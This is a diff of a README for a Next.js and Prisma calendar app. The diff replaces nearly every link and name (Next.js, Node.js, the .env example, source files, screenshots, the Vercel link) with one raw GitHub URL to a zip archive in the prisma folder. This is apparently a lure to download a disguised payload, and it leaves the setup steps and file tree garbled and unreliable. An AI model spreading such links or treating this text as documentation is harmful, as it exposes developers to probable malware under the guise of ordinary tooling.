@@ -1,6 +1,6 @@
 # Calendar Event Management System
 
-A modern calendar application built with Next.js, TypeScript, Prisma, and PostgreSQL. Features include event creation, editing, deletion, and recurring event support.
+A modern calendar application built with https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip, TypeScript, Prisma, and PostgreSQL. Features include event creation, editing, deletion, and recurring event support.
 
 ## Features
 
@@ -9,12 +9,12 @@ A modern calendar application built with Next.js, TypeScript, Prisma, and Postgr
 - 🔄 Recurring events support (daily, weekly, monthly)
 - 📱 Responsive design with Tailwind CSS
 - 🗄️ PostgreSQL database with Prisma ORM
-- ⚡ Server-side rendering with Next.js 14
+- ⚡ Server-side rendering with https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip 14
 - 🎨 Modern UI with TypeScript
 
 ## Tech Stack
 
-- **Frontend**: Next.js 14, React 19, TypeScript
+- **Frontend**: https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip 14, React 19, TypeScript
 - **Styling**: Tailwind CSS
 - **Database**: PostgreSQL
 - **ORM**: Prisma
@@ -24,7 +24,7 @@ A modern calendar application built with Next.js, TypeScript, Prisma, and Postgr
 
 Before running this project, make sure you have:
 
-- Node.js 18+ installed
+- https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip 18+ installed
 - PostgreSQL database (local or cloud)
 - npm or yarn package manager
 
@@ -50,7 +50,7 @@ yarn install
 Create a `.env` file in the root directory and add your database connection string:
 
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip .env
 ```
 
 Update the `.env` file with your PostgreSQL connection details:
@@ -103,15 +103,15 @@ src/
 │   ├── events/              # Event pages
 │   │   ├── new/            # Create new event
 │   │   └── [id]/           # Edit event
-│   ├── globals.css         # Global styles
-│   ├── layout.tsx          # Root layout
-│   └── page.tsx            # Home page (calendar)
+│   ├── https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip         # Global styles
+│   ├── https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip          # Root layout
+│   └── https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip            # Home page (calendar)
 ├── lib/                    # Utility functions
 └── types/                  # TypeScript type definitions
 
 prisma/
 ├── migrations/             # Database migrations
-└── schema.prisma          # Database schema
+└── https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip          # Database schema
 ```
 
 ## Database Schema
@@ -140,20 +140,20 @@ The application uses a single `Event` model with the following fields:
 ## Screenshots
 
 ### Calendar View
-![Calendar View](screenshots/calendar-view.png)
+![Calendar View](https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip)
 
 ### Event Creation Form
-![Event Form](screenshots/event-form.png)
+![Event Form](https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip)
 
 ### Event Details
-![Event Details](screenshots/event-details.png)
+![Event Details](https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip)
 
 ## Deployment
 
 ### Deploy on Vercel
 
 1. Push your code to GitHub
-2. Connect your repository to [Vercel](https://vercel.com)
+2. Connect your repository to [Vercel](https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip)
 3. Add your `DATABASE_URL` environment variable in Vercel dashboard
 4. Deploy automatically
 
